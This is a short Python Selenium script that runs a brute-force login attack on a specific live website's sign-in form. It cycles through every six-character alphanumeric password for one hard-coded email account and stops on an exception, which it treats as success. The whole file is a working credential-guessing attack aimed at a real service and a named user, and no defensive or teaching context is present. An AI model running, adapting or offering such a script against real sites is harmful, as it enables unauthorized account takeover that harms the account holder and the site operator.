from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time
import string
from itertools import product

letters = string.ascii_letters + "0123456789"
# +"ₐ₈CDₑբGₕᵢⱼₖₗₘₙₒₚQᵣₛₜᵤᵥwₓᵧZₐ♭꜀ᑯₑբ₉ₕᵢⱼₖₗₘₙₒₚ૧ᵣₛₜᵤᵥwₓᵧ₂₀₁₂₃₄₅₆₇₈₉₊₋₌₍₎"+"ا ب ك د ا ف غ ه ا ج ك ل م ن او ب ك ر س ت ا ف و كس ي ز ا ب ك د ا ف غ ه ا ج ك ل م ن او ب ك ر س ت ا ف و كس ي ز"

driver = webdriver.Chrome()

def bruteforce(usuario):
    driver.get("https://mybox.cl/iniciar-sesion?back=identity")

    for i in product(list(letters),repeat=6):
        try:
            user = driver.find_element_by_xpath('//*[@id="login-form"]/section/div[1]/div[1]/input')
            user.clear()
            user.send_keys(usuario)
            psswrd = driver.find_element_by_xpath('//*[@id="login-form"]/section/div[2]/div[1]/div/input')
            psswrd.clear()

            psw = "".join(i)
            psswrd.send_keys(psw)

            click = driver.find_element_by_xpath('//*[@id="submit-login"]').click()
            #time.sleep(0.2)
            print("password:",psw)
        except:
            print("Se encontró contraseña o hubo un error")
            break

bruteforce("basty3lol@gmail.com")
